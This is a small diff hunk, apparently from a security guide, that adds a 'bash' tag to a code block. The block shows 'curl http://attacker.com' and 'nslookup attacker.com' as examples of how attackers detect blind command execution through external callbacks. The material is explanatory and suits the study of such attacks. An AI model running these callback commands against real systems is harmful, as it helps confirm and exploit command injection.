@@ -163,7 +163,7 @@ Attackers may use external services to detect command execution.
 
 Examples:
 
-```
+```bash
 curl http://attacker.com
 nslookup attacker.com
 ```
